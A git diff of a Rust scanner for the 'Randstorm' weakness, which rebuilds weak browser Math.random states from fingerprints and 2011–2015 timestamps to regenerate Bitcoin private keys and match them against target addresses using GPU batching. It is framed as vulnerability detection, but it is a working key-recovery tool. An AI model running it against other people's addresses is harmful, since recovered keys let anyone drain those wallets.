@@ -5,11 +5,10 @@ use super::config::{ScanConfig, ScanMode};
 /// and wallet address derivation to detect vulnerable wallets.
 use super::fingerprints::{BrowserConfig, FingerprintDatabase, Phase, TimestampGenerator};
 use super::gpu_integration::{GpuScanner, MatchedKey};
-use super::prng::{ChromeV8Prng, SeedComponents};
+use super::prng::{MathRandomEngine, SeedComponents};
 use super::progress::ProgressTracker;
 use anyhow::{Context, Result};
 use bitcoin::{Address, Network, PrivateKey, PublicKey};
-use secp256k1::Secp256k1;
 use tracing::{info, warn};
 
 /// Vulnerability finding result
@@ -32,26 +31,31 @@ pub enum Confidence {
 /// Main Randstorm scanner
 pub struct RandstormScanner {
     database: FingerprintDatabase,
-    prng: ChromeV8Prng,
-    secp: Secp256k1<secp256k1::All>,
     config: ScanConfig,
     gpu_scanner: Option<GpuScanner>,
+    secp: bitcoin::secp256k1::Secp256k1<bitcoin::secp256k1::All>,
+    engine: MathRandomEngine,
 }
 
 impl RandstormScanner {
     /// Create new scanner instance
     pub fn new() -> Result<Self> {
-        Self::with_config(ScanConfig::default())
+        Self::with_config(ScanConfig::default(), MathRandomEngine::V8Mwc1616)
     }
 
     /// Create scanner with custom configuration
-    pub fn with_config(config: ScanConfig) -> Result<Self> {
-        let database =
-            FingerprintDatabase::load().context("Failed to load fingerprint database")?;
+    pub fn with_config(config: ScanConfig, engine: MathRandomEngine) -> Result<Self> {
+        let database = FingerprintDatabase::load_comprehensive()
+            .context("Failed to load comprehensive fingerprint database")?;
 
         // Initialize GPU scanner if enabled
         let gpu_scanner = if config.use_gpu {
-            match GpuScanner::new(config.clone()) {
+            match GpuScanner::new(
+                config.clone(),
+                engine,
+                None,
+                true, /* include uncompressed by default for GPU path */
+            ) {
                 Ok(scanner) => {
                     info!("✅ GPU acceleration enabled");
                     Some(scanner)
@@ -69,69 +73,122 @@ impl RandstormScanner {
 
         Ok(Self {
             database,
-            prng: ChromeV8Prng::new(),
-            secp: Secp256k1::new(),
             config,
             gpu_scanner,
+            secp: bitcoin::secp256k1::Secp256k1::new(),
+            engine,
         })
     }
 
     /// Scan with GPU acceleration and progress tracking
+    #[allow(unused_variables)] // address_hashes used in conditional compilation blocks
     pub fn scan_with_progress(
         &mut self,
         target_addresses: &[String],
         phase: Phase,
     ) -> Result<Vec<VulnerabilityFinding>> {
-        // Convert addresses to hash format for GPU
+        // Convert addresses to hash format
         let address_hashes = self.prepare_target_addresses(target_addresses)?;
 
-        // Get fingerprints for the phase
-        let fingerprints = self.database.get_fingerprints_for_phase(phase);
-        let total = fingerprints.len() as u64;
+        // Select configs for the requested phase from the comprehensive DB
+        let configs: Vec<BrowserConfig> = self.database.get_configs_for_phase(phase).to_vec();
+
+        // Build streaming permutation generator across configs × timestamps
+        let mut streaming = StreamingScan::new(configs, self.config.scan_mode);
+        // Prime the stream to ensure we have at least one fingerprint available.
+        let mut lookahead = streaming.next_fingerprint();
+        if lookahead.is_none() {
+            anyhow::bail!("No fingerprints generated — check timestamp range and configs");
+        }
+        #[allow(unused_mut)] // Mutated in GPU/CPU conditional blocks
+        let mut findings = Vec::new();
+
+        let total_fingerprints = streaming.total_fingerprints();
+        let target_total = if let Some(max) = self.config.max_fingerprints {
+            total_fingerprints.min(max)
+        } else {
+            total_fingerprints
+        };
 
         info!("🔍 Starting Randstorm scan");
         info!("   Phase: {:?}", phase);
         info!("   Targets: {}", target_addresses.len());
-        info!("   Fingerprints: {}", total);
+        info!("   Fingerprints (est.): {}", target_total);
+        info!("   Scan mode: {:?}", self.config.scan_mode);
 
-        let mut progress = ProgressTracker::new(total);
-        let mut findings = Vec::new();
+        let mut progress = ProgressTracker::new(target_total);
+        #[allow(unused_mut)] // Mutated via saturating_add in loop
+        let mut total_processed: u64 = 0;
+
+        let mut batch_capacity = self.config.batch_size.unwrap_or(10_000);
+        if batch_capacity == 0 {
+            batch_capacity = 10_000;
+        }
 
         #[cfg(feature = "gpu")]
         if let Some(ref mut gpu) = self.gpu_scanner {
-            // GPU-accelerated scan
-            let batch_size = gpu.calculate_batch_size()?;
-            info!("   Batch size: {}", batch_size);
+            batch_capacity = gpu.calculate_batch_size().unwrap_or(batch_capacity);
+            info!("   GPU batch size: {}", batch_capacity);
+        }
 
-            let mut all_matches = Vec::new();
-            let mut total_processed = 0u64;
-
-            for chunk in fingerprints.chunks(batch_size) {
-                let result =
-                    gpu.process_batch(chunk, &address_hashes, target_addresses.len() as u32)?;
-
-                total_processed += result.keys_processed;
-                all_matches.extend(result.matches_found);
-
-                if total_processed % (batch_size as u64 * 10) == 0 {
-                    progress.update(total_processed, all_matches.len() as u64);
-                    progress.print_update();
+        loop {
+            // Respect max_fingerprints cap if set
+            if let Some(max) = self.config.max_fingerprints {
+                if total_processed >= max {
+                    break;
                 }
             }
 
-            // Convert all matches to findings after releasing the mutable borrow
-            for matched in all_matches {
-                findings.push(self.match_to_finding(matched, phase)?);
+            let mut batch = Vec::with_capacity(batch_capacity);
+            // Consume lookahead first (if present), then stream further.
+            if let Some(fp) = lookahead.take() {
+                batch.push(fp);
+            }
+            while batch.len() < batch_capacity {
+                match streaming.next_fingerprint() {
+                    Some(fp) => batch.push(fp),
+                    None => break,
+                }
             }
 
-            progress.update(total_processed, findings.len() as u64);
-        }
+            if batch.is_empty() {
+                break;
+            }
 
-        // CPU fallback when GPU unavailable or --cpu flag set
-        if self.gpu_scanner.is_none() {
-            warn!("Using CPU fallback (slower)");
-            findings = self.cpu_scan(target_addresses, &fingerprints)?;
-            progress.update(fingerprints.len() as u64, findings.len() as u64);
+            #[allow(unused_mut)] // Mutated in GPU/CPU conditional blocks
+            let mut batch_matches = 0usize;
+
+            #[cfg(feature = "gpu")]
+            if let Some(ref mut gpu) = self.gpu_scanner {
+                // GPU scan path with error recovery
+                match gpu.process_batch(&batch, &address_hashes, target_addresses.len() as u32) {
+                    Ok(result) => {
+                        total_processed = total_processed.saturating_add(result.keys_processed);
+                        for matched in result.matches_found {
+                            findings.push(self.match_to_finding(matched, phase)?);
+                        }
+                        batch_matches = result.matches_found.len();
+                    }
+                    Err(e) => {
+                        warn!("GPU batch processing failed: {}", e);
+                        warn!("Falling back to CPU for this batch");
+                        let cpu_results =
+                            self.cpu_scan_batch(target_addresses, &address_hashes, &batch)?;
+                        total_processed = total_processed.saturating_add(batch.len() as u64);
+                        batch_matches = cpu_results.len();
+                        findings.extend(cpu_results);
+                    }
+                }
+            } else {
+                // CPU fallback path
+                let cpu_results = self.cpu_scan_batch(target_addresses, &address_hashes, &batch)?;
+                total_processed = total_processed.saturating_add(batch.len() as u64);
+                batch_matches = cpu_results.len();
+                findings.extend(cpu_results);
+            }
+
+            progress.update(batch.len() as u64, batch_matches as u64);
+            progress.print_update();
         }
 
         info!("\n✅ Scan complete!");
@@ -143,13 +200,13 @@ impl RandstormScanner {
     }
 
     /// Prepare target addresses for GPU comparison
-    fn prepare_target_addresses(&self, addresses: &[String]) -> Result<[Vec<u8>; 20]> {
+    fn prepare_target_addresses(&self, addresses: &[String]) -> Result<Vec<Vec<u8>>> {
         use bitcoin::Address;
         use std::str::FromStr;
 
-        let mut result: [Vec<u8>; 20] = Default::default();
+        let mut result: Vec<Vec<u8>> = Vec::with_capacity(addresses.len());
 
-        for (i, addr_str) in addresses.iter().enumerate().take(20) {
+        for addr_str in addresses {
             // Parse Bitcoin address and extract hash160
             let address_unchecked = Address::from_str(addr_str)
                 .context(format!("Invalid Bitcoin address: {}", addr_str))?;
@@ -164,11 +221,11 @@ impl RandstormScanner {
             if script_pubkey.is_p2pkh() {
                 // P2PKH script: OP_DUP OP_HASH160 <20 bytes> OP_EQUALVERIFY OP_CHECKSIG
                 let hash_bytes = &script_pubkey.as_bytes()[3..23]; // Skip 3-byte prefix, take 20 bytes
-                result[i] = hash_bytes.to_vec();
+                result.push(hash_bytes.to_vec());
             } else if script_pubkey.is_p2sh() {
                 // P2SH script: OP_HASH160 <20 bytes> OP_EQUAL
                 let hash_bytes = &script_pubkey.as_bytes()[2..22]; // Skip 2-byte prefix, take 20 bytes
-                result[i] = hash_bytes.to_vec();
+                result.push(hash_bytes.to_vec());
             } else {
                 // For other address types (P2WPKH, P2WSH), this is a placeholder
                 // Randstorm primarily affects P2PKH addresses from browser wallets
@@ -183,6 +240,7 @@ impl RandstormScanner {
     }
 
     /// Convert GPU match to vulnerability finding
+    #[allow(dead_code)] // Used in GPU feature conditional compilation
     fn match_to_finding(&self, matched: MatchedKey, phase: Phase) -> Result<VulnerabilityFinding> {
         // Convert fingerprint to browser config
         let browser_config = BrowserConfig {
@@ -213,70 +271,33 @@ impl RandstormScanner {
     }
 
     /// CPU fallback implementation
-    fn cpu_scan(
+    #[allow(dead_code)] // Used when GPU feature disabled
+    fn cpu_scan_batch(
         &self,
         target_addresses: &[String],
+        target_hashes: &[Vec<u8>],
         fingerprints: &[super::fingerprint::BrowserFingerprint],
     ) -> Result<Vec<VulnerabilityFinding>> {
-        use super::prng::{PrngEngine, SeedComponents};
-        use bitcoin::Address;
         use rayon::prelude::*;
-        use std::str::FromStr;
-
-        // Parse and decode target addresses
-        let target_hashes: Vec<Vec<u8>> = target_addresses
-            .iter()
-            .filter_map(|addr_str| {
-                Address::from_str(addr_str)
-                    .ok()
-                    .and_then(|address_unchecked| {
-                        let address = address_unchecked.assume_checked();
-                        let script_pubkey = address.script_pubkey();
-
-                        if script_pubkey.is_p2pkh() {
-                            Some(script_pubkey.as_bytes()[3..23].to_vec())
-                        } else if script_pubkey.is_p2sh() {
-                            Some(script_pubkey.as_bytes()[2..22].to_vec())
-                        } else {
-                            None
-                        }
-                    })
-            })
-            .collect();
 
         // Parallel scan using Rayon
         let findings: Vec<VulnerabilityFinding> = fingerprints
             .par_iter()
             .filter_map(|fp| {
-                // Create thread-local PRNG and secp context
-                use super::prng::ChromeV8Prng;
                 use bitcoin::secp256k1::Secp256k1;
 
-                let prng = ChromeV8Prng::new();
                 let secp = Secp256k1::new();
 
-                // Create seed from fingerprint
-                let seed = SeedComponents {
-                    timestamp_ms: fp.timestamp_ms,
-                    user_agent: fp.user_agent.clone(),
-                    screen_width: fp.screen_width,
-                    screen_height: fp.screen_height,
-                    color_depth: fp.color_depth,
-                    timezone_offset: fp.timezone_offset as i16,
-                    language: fp.language.clone(),
-                    platform: fp.platform.clone(),
-                };
-
-                // Generate PRNG state
-                let state = prng.generate_state(&seed);
-
-                // Generate key bytes
-                let key_bytes = prng.generate_bytes(&state, 32);
-                let mut key_array = [0u8; 32];
-                key_array.copy_from_slice(&key_bytes[..32]);
+                // Generate key bytes using selected Math.random engine
+                let key_bytes =
+                    super::prng::bitcoinjs_v013::BitcoinJsV013Prng::generate_privkey_bytes(
+                        fp.timestamp_ms,
+                        self.engine,
+                        None,
+                    );
 
                 // Create secret key
-                if let Ok(secret_key) = bitcoin::secp256k1::SecretKey::from_slice(&key_array) {
+                if let Ok(secret_key) = bitcoin::secp256k1::SecretKey::from_slice(&key_bytes) {
                     let public_key =
                         bitcoin::secp256k1::PublicKey::from_secret_key(&secp, &secret_key);
                     let address_hash = super::derivation::derive_address_hash(&public_key);
@@ -318,13 +339,13 @@ impl RandstormScanner {
     }
 
     /// Scan an address for Randstorm vulnerability
-    pub fn scan(&self, _address: &str, _phase: Phase) -> Result<Option<VulnerabilityFinding>> {
-        // TODO Phase 1: Implement full scanning logic
-        // This is a placeholder for Story 1.6-1.8
-        Ok(None)
+    pub fn scan(&mut self, address: &str, phase: Phase) -> Result<Option<VulnerabilityFinding>> {
+        let findings = self.scan_with_progress(&[address.to_string()], phase)?;
+        Ok(findings.into_iter().find(|f| f.address == address))
     }
 
     /// Derive Bitcoin address from PRNG output (pre-BIP32)
+    #[allow(dead_code)]
     fn derive_direct_key(&self, prng_bytes: &[u8; 32]) -> Result<Address> {
         let privkey = PrivateKey::from_slice(prng_bytes, Network::Bitcoin)
             .context("Invalid private key from PRNG")?;
@@ -337,6 +358,7 @@ impl RandstormScanner {
     }
 
     /// Convert browser config to seed components
+    #[allow(dead_code)]
     fn config_to_seed(&self, config: &BrowserConfig, timestamp: u64) -> SeedComponents {
         SeedComponents {
             timestamp_ms: timestamp,
@@ -422,9 +444,9 @@ impl StreamingScan {
     pub fn new(configs: Vec<BrowserConfig>, scan_mode: ScanMode) -> Self {
         // Default to June 2011 - June 2015 vulnerable window
         let start_ms = 1306886400000; // June 1, 2011
-        let end_ms = 1435708799000;   // June 30, 2015
+        let end_ms = 1435708799000; // June 30, 2015
         let interval_ms = scan_mode.interval_ms();
-        
+
         Self {
             configs,
             timestamp_gen: TimestampGenerator::new(start_ms, end_ms, interval_ms),
@@ -432,7 +454,7 @@ impl StreamingScan {
             scan_mode,
         }
     }
-    
+
     /// Create with custom time range
     pub fn with_time_range(
         configs: Vec<BrowserConfig>,
@@ -441,7 +463,7 @@ impl StreamingScan {
         end_ms: u64,
     ) -> Self {
         let interval_ms = scan_mode.interval_ms();
-        
+
         Self {
             configs,
             timestamp_gen: TimestampGenerator::new(start_ms, end_ms, interval_ms),
@@ -449,35 +471,35 @@ impl StreamingScan {
             scan_mode,
         }
     }
-    
+
     /// Get next fingerprint in stream (config × timestamp permutation)
     pub fn next_fingerprint(&mut self) -> Option<super::fingerprint::BrowserFingerprint> {
         use super::fingerprint::BrowserFingerprint;
-        
+
         // Try next timestamp for current config
         if let Some(ts) = self.timestamp_gen.next() {
             let config = &self.configs[self.current_config_idx];
             return Some(BrowserFingerprint::from_config_and_timestamp(config, ts));
         }
-        
+
         // Move to next config
         self.current_config_idx += 1;
         if self.current_config_idx >= self.configs.len() {
             return None; // Scan complete
         }
-        
+
         // Reset timestamp generator for new config
         self.timestamp_gen.reset();
         self.next_fingerprint()
     }
-    
+
     /// Get total fingerprint count for this scan
     pub fn total_fingerprints(&self) -> u64 {
-        let timestamps_per_config = (self.timestamp_gen.end_ms - self.timestamp_gen.start_ms) 
+        let timestamps_per_config = (self.timestamp_gen.end_ms - self.timestamp_gen.start_ms)
             / self.timestamp_gen.interval_ms;
         timestamps_per_config * self.configs.len() as u64
     }
-    
+
     /// Get current scan mode
     pub fn scan_mode(&self) -> ScanMode {
         self.scan_mode
@@ -521,24 +543,23 @@ mod streaming_tests {
                 year_max: 2015,
             },
         ];
-        
+
         let start_ms = 1293840000000; // 2011-01-01
-        let end_ms = 1293926400000;   // 2011-01-02
-        
+        let end_ms = 1293926400000; // 2011-01-02
+
         let mut scan = StreamingScan::with_time_range(
             configs,
             ScanMode::Standard, // 1 hour intervals
             start_ms,
             end_ms,
         );
-        
+
         // Should iterate through 24 timestamps × 2 configs = 48 fingerprints
         let mut count = 0;
         while scan.next_fingerprint().is_some() {
             count += 1;
         }
-        
+
         assert_eq!(count, 48, "Expected 24 timestamps × 2 configs");
     }
 }
-
